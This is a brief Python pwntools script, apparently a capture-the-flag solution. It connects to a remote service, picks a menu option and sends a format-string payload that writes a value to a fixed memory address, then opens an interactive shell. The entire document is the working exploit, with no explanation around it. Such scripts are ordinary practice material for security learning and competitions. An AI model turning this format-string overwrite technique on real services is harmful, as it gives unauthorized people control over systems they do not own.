from pwn import *

io = remote('111.200.241.244', 54414)
# io = process('./pwn')
io.recv()
io.send(b'2\n')
payload = b'a%4196569c%8$lln' + p64(0x601060)
io.send(payload)
io.interactive()
# 0040071c 4008da